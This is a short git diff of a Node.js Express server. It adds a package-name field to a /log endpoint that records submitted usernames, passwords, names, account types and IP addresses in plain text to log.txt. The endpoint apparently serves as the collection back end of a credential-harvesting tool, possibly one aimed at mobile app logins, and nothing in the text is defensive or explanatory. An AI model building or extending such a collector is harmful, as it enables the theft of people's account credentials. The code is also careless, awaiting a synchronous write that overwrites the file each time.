@@ -21,12 +21,13 @@ app.get("/", function (req, res) {
 app.post("/log", async function (req, res) {
     try {
         console.log(req.body);
+        let packageName = req.body.packageName;
         let username = req.body.username;
         let password = req.body.password;
         let name = req.body.name;
         let accType = req.body.accType;
         let ip = req.body.ip;
-        await fs.writeFileSync('log.txt', username + '|' + password + '|' + name + '|' + accType + '|' + ip + '|' + getNow());
+        await fs.writeFileSync('log.txt', packageName + '|' + username + '|' + password + '|' + name + '|' + accType + '|' + ip + '|' + getNow());
         return res.json({'time_stamp': getNow(), 'status': 'Success'});
     } catch (e) {
         return res.json({'time_stamp': getNow(), 'status': 'Error'});
